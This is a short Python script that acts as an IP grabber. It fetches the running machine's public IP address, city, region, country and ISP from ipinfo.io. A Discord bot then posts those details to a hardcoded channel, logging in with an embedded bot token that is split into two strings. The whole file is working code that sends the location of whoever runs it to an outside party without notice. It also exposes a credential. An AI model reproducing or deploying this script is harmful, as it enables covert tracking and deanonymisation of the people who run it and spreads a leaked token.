import re
import json
from urllib.request import urlopen

url = 'http://ipinfo.io/json'
response = urlopen(url)
data = json.load(response)

IP=data['ip']
org=data['org']
city = data['city']
country=data['country']
region=data['region']
txtt=('IP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP))

import discord
import asyncio
from discord.ext import commands

bot = commands.Bot(command_prefix="!")

async def send_message(channel_id: int, msg):
	channel = bot.get_channel(channel_id)
	await channel.send(msg)

@bot.event
async def on_ready():
	asyncio.run_coroutine_threadsafe(send_message(944162397801816067, 'IP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP)), bot.loop)

s="OTQ0MTYwNzI1MzkwMjA0OTMw.Yg9kMg.Xc4UhBwh8H7XC3izm7jwd3XGgM"+"c"

# channel.send(message)
# bot.loop.create_task(background_task())
bot.run(s)
